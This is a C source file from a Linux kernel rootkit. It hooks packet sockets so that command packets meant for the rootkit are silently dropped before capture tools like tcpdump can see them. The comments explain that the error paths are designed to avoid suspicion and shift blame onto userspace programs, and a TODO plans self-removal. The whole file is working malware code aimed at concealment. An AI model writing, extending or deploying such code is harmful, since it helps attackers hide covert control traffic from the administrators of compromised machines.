#include <linux/net.h>
#include <linux/netdevice.h>
#include <net/sock.h>

#include "hook.h"
#include "packet_hook.h"
#include "af_packet_internal.h"
#include "../headers/networking.h"


int is_packet_sock(struct socket *sock) {
    if (!sock->sk) return 0;
    return sock->sk->sk_family == PF_PACKET;
}

static int hooked_packet_setsockopt(struct socket *sock, int level, int optname,
		                            char __user *optval, unsigned int optlen)
{
    int result;
    unsigned long _flags;
    struct hooked_socket_entry *sock_hook = get_socket_hook(sock);

    // This case shouldn't happen, but if it does, the userspace program is likely to break.
    // Returning 0 means the syscall will not be very suspicious without heavy debugging, 
    // the immidiete suspect will be the userspace program, instead of the kernel.
    // TODO: Add a panic method that will remove the rootkit if this happends.
    if (!sock_hook) return 0;

    result = sock_hook->original_packet_ops->setsockopt(sock, level, optname, optval, optlen);
    spin_lock_irqsave(&hook_packet_lock, _flags);
    hook_packet_sock(sock);
	spin_unlock_irqrestore(&hook_packet_lock, _flags);
    return result;
}

static int hooked_packet_rcv(struct sk_buff *skb, struct net_device *dev,
		      struct packet_type *pt, struct net_device *orig_dev)
{
    struct hooked_socket_entry *sock_hook = get_socket_hook_by_prot_hook(pt);

    if (is_skb_cmd(skb)) {
        kfree_skb(skb);
        return 0;
    }

    // This case shouldn't happen, but if it does, the userspace program is likely to break.
    // Returning 0 means the syscall will not be very suspicious without heavy debugging, 
    // the immidiete suspect will be the userspace program, instead of the kernel.
    // TODO: Add a panic method that will remove the rootkit if this happends.
    if (!sock_hook) return 0;

    return sock_hook->original_packet_rcv(skb, dev, pt, orig_dev);
}

void hook_packet_sock(struct socket *sock) {
    struct proto_ops *hooked_ops;
    get_or_create_socket_hook(sock, &hooked_ops);

    hooked_ops->setsockopt = hooked_packet_setsockopt;
    pkt_sk(sock->sk)->prot_hook.func = hooked_packet_rcv;
}
